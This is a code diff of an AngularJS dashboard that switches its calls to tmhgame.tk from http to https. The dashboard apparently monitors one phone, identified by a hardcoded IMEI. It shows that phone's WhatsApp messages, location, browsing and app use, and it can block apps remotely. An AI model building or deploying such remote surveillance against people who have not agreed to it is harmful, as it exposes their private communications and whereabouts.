@@ -179,7 +179,7 @@
         </thead>
         <tbody>
         <tr ng-repeat="m in aa">
-            <td><img ng-src="http://tmhgame.tk/{{m.package}}.png" style="width: 60px; height: 60px"></td>
+            <td><img ng-src="https://tmhgame.tk/{{m.package}}.png" style="width: 60px; height: 60px"></td>
             <td>
                 <h5 >{{m.name}}</h5>
                 <h5>{{$index}}</h5>
@@ -203,7 +203,7 @@
         </thead>
         <tbody>
         <tr ng-repeat="m in gunluk">
-            <td><img ng-src="http://tmhgame.tk/{{m.package}}.png" style="width: 60px; height: 60px"></td>
+            <td><img ng-src="https://tmhgame.tk/{{m.package}}.png" style="width: 60px; height: 60px"></td>
             <td>
                 <h5 >{{m.name}}</h5>
                 <p>{{stringUtil.toTime(m.start)}}</p>
@@ -226,7 +226,7 @@
         </thead>
         <tbody>
         <tr ng-repeat="m in youtubes">
-            <td><img ng-src="http://tmhgame.tk/com.google.android.youtube.png" style="width: 60px; height: 60px"></td>
+            <td><img ng-src="https://tmhgame.tk/com.google.android.youtube.png" style="width: 60px; height: 60px"></td>
             <td>
                 <h5 >{{m.name}}</h5>
                 <p>{{stringUtil.toTime(m.start)}}</p>
@@ -250,7 +250,7 @@
         </thead>
         <tbody>
         <tr ng-repeat="m in websites">
-            <td><img ng-src="http://tmhgame.tk/com.android.chrome.png" style="width: 60px; height: 60px"></td>
+            <td><img ng-src="https://tmhgame.tk/com.android.chrome.png" style="width: 60px; height: 60px"></td>
             <td>
                 <h5 style="display: block;width: 100px;overflow: hidden;white-space: nowrap;text-overflow: ellipsis;">{{m.url}}</h5>
                 <p>{{stringUtil.toTime(m.start)}}</p>
@@ -275,7 +275,7 @@
         </thead>
         <tbody>
         <tr ng-repeat="m in whatsaps" ng-click="openc(m)">
-            <td><img ng-src="http://tmhgame.tk/com.whatsapp.png" style="width: 60px; height: 60px"></td>
+            <td><img ng-src="https://tmhgame.tk/com.whatsapp.png" style="width: 60px; height: 60px"></td>
             <td>
                 <h5 >{{m.sender}}</h5>
                 <p>{{m.number}}</p>
@@ -295,7 +295,7 @@
         </thead>
         <tbody>
         <tr ng-repeat="m in curConversation.con" >
-            <td><img ng-src="http://tmhgame.tk/com.whatsapp.png" style="width: 60px; height: 60px"></td>
+            <td><img ng-src="https://tmhgame.tk/com.whatsapp.png" style="width: 60px; height: 60px"></td>
             <td>
                 <h5 >{{m.sender}}</h5>
                 <p>{{m.content}}</p>
@@ -395,7 +395,7 @@
             console.log(b);
             console.log("block status gonderildi " + block)
 
-            $http.get('http://tmhgame.tk/blockApp?imei='+$scope.d.imei+'&package='+b+'&block='+block).then(function (d) {
+            $http.get('https://tmhgame.tk/blockApp?imei='+$scope.d.imei+'&package='+b+'&block='+block).then(function (d) {
                 console.log(d.data.apps + " " + $scope.imei);
 
                 c.blocked = c.blocked ^ true;
@@ -411,7 +411,7 @@
 
            console.log("Location Called");
 
-           $http.get('http://tmhgame.tk/sendCommand?imei=356769106360753&sendLocation=1').then(function (d) {
+           $http.get('https://tmhgame.tk/sendCommand?imei=356769106360753&sendLocation=1').then(function (d) {
                console.log(d.data.locations);
                //test data
                d.data.locations = [
@@ -471,7 +471,7 @@
                            },
                            draggable:true,
                            icon: {
-                               url: 'http://tmhgame.tk/googlemapicon.png',
+                               url: 'https://tmhgame.tk/googlemapicon.png',
                                origin: new google.maps.Point(0, 0),
                                labelOrigin: new google.maps.Point(20, -10)
                            },
@@ -510,7 +510,7 @@
 
         $scope.Web = function() {
 
-            $http.get('http://tmhgame.tk/sendCommand?imei=356769106360753&sendWebsites=1').then(function (d) {
+            $http.get('https://tmhgame.tk/sendCommand?imei=356769106360753&sendWebsites=1').then(function (d) {
                 console.log(d.data.data);
                 if(d.data.data == undefined) {
                     return;
@@ -529,7 +529,7 @@
         }
        $scope.whatsappf = function() {
 
-           $http.get('http://tmhgame.tk/Whatsapp?imei=356769106360753').then(function (d) {
+           $http.get('https://tmhgame.tk/Whatsapp?imei=356769106360753').then(function (d) {
                console.log(d);
                $scope.whatsaps = d.data.con;
                $scope.whatsaps.sort(function (a, b) {
@@ -543,7 +543,7 @@
        }
         $scope.gundelik = function() {
 
-            $http.get('http://tmhgame.tk/sendCommand?imei=356769106360753').then(function (d) {
+            $http.get('https://tmhgame.tk/sendCommand?imei=356769106360753').then(function (d) {
                 console.log(d.data.data);
 
                 $scope.gunluk = d.data.data;
@@ -586,7 +586,7 @@
 
        $scope.yact = function() {
 
-           $http.get('http://tmhgame.tk/sendCommand?imei=356769106360753&youtube=1').then(function (d) {
+           $http.get('https://tmhgame.tk/sendCommand?imei=356769106360753&youtube=1').then(function (d) {
                console.log(d.data.data);
                if(d.data.data == undefined) {
                    return;
@@ -613,7 +613,7 @@
         $scope.Web();
 
         //$scope.aa=[];
-        $http.get('http://tmhgame.tk/getDevice?imei=356769106360753').then(function (d) {
+        $http.get('https://tmhgame.tk/getDevice?imei=356769106360753').then(function (d) {
             console.log(d.data.apps);
             if(d.data.apps == undefined) {
                 return;
